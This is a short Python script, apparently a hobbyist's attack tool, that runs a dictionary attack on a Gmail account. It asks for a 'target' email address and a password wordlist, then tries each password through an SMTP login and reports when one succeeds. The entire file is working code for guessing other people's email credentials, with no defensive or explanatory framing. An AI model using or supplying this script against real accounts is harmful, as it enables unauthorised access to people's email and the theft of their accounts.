#/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/24/2021

import smtplib
from termcolor import colored

smtpServer = smtplib.SMTP("smtp.gmail.com", 587)
smtpServer.ehlo()
smtpServer.starttls()

user = input("Enter Target Email Address: ")
file = input("Enter Path to Password File: ")
passwordFile = open(file, "r")

for password in passwordFile:
    password = password.strip('\n')
    try:
        smtpServer.login(user, password)
        print(colored('[+] Password Found: %s' % password, "green")) 
    except smtplib.SMTPAuthenticationError:
        print(colored('[-] Wrond Password: %s' % password, "red"))

